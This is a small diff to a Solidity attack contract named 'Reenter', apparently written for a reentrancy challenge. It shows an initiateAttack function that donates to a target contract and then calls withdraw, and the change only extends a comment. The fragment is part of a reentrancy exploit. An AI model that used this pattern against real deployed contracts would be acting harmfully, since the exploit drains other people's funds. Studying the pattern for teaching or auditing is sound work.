@@ -38,7 +38,7 @@ contract Reenter {
     }
 
 function initiateAttack() public {
-    reentranceContract.donate{value:amount}(address(this));//need to increase the balances account in order to pass the first if statement
+    reentranceContract.donate{value:amount}(address(this));//need to increase the balances account in order to pass the first if statement of the withdraw function
     reentranceContract.withdraw(amount); 
   }
   
